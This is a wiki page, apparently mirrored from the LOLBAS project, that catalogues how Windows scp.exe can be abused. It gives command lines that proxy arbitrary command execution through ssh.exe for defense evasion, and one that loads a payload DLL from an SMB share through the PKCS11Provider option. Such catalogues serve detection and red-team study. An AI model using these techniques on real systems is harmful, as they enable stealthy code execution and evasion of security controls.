# LOLBAS: scp.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Used for uploading or downloading files over SSH.

## Comandos

### Proxy execution of specified command, can be used as a defensive evasion.

Execute · priv: User · T1202

```cmd
scp.exe -o ProxyCommand="{CMD}" . localhost:.
```

Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).

### Proxy execution of specified command, can be used as a defensive evasion.

Execute · priv: User · T1202

```cmd
scp.exe -S "{CMD}" . localhost:.
```

Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).

### Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.

Execute · priv: User · T1218

```cmd
scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
```

Loads a DLL from an absolute path or SMB path into child process `ssh.exe` by abusing the `PKCS11Provider` option. The payload executes upon DLL load (`DllMain`) and requires exporting `C_GetFunctionList` to prevent premature termination by `scp.exe`.

